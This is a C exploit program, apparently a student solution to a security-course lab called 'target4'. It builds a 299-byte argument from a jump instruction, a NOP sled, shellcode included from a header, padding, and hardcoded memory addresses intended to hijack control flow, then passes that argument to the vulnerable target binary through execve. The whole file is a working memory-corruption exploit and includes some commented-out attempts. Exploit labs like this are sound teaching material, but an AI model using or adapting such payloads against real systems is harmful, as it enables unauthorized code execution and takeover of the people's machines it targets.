#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"

int main(void)
{
	char *arg1 = (char*)malloc(299);
//	printf("sizeof arg1 =%d\naddress of arg1 =%x\n", sizeof(arg1), &arg1 );
	int i;
	memset(arg1, 'a', 299);
//	for(i=0; i < 2; i++)
//	memcpy(arg1+i,"\x03\xeb",2); 
	arg1[0] = '\x08';
	arg1[1] = '\xeb';
	arg1[2] = 0x11;
	arg1[3] = 0x11;
	arg1[4] = 0x51;
	arg1[5] = 0x96;
	arg1[6] = 0x05;
	arg1[7] = 0x08;
/*	arg1[9] = 0x08;
	arg1[10] = 0x97;
	arg1[11] = 0x05;
	arg1[12] = 0x08;
	arg1[13] = 0x3c;
	arg1[14] = 0xfe;
	arg1[15] = 0xff;
	arg1[16] = 0xbf;
*/	
	for(i=8; i<100; i++)
		arg1[i] = 0x90;
	for(i=0; i<strlen(shellcode);i++)
		arg1[i+100] = shellcode[i];

	for(i=strlen(shellcode)+100; i<176; i++)
		arg1[i]= 0x41;

	/*for(i=0; i<2; i++)
		weapon[i] =
	*/
	arg1[176]= 0x50;
	arg1[177]= 0x96;
	arg1[178]= 0x05;
	arg1[179]= 0x08;
	arg1[180]= 0x1c;
	arg1[181]= 0xfd;
	arg1[182]= 0xff;
	arg1[183]= 0xbf;
	arg1[298]= 0;
	//char arg1[] = "Hi there!";
	char *args[] = { TARGET, arg1, NULL };
	char *env[] = { NULL };
//	for(i=0; i<strlen(shellcode); i++)
	if (0 > execve(TARGET, args, env))
		fprintf(stderr, "execve failed.\n");

	return 0;
}
